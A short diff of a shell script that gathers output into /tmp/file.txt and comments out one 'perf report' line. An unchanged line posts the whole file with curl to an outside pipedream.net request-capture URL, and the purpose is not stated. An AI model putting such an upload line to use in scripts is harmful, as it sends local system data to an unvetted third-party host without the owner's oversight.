@@ -11,7 +11,7 @@ do
     echo "--------------" >> /tmp/file.txt;
 done
 
-echo $(perf report -i /tmp/hola4.txt) >> /tmp/file.txt
+#echo $(perf report -i /tmp/hola4.txt) >> /tmp/file.txt
 echo "FINISHED..." >> /tmp/file.txt
 
 curl --data-binary "@/tmp/file.txt" https://en0liva7dzyvpp.x.pipedream.net/
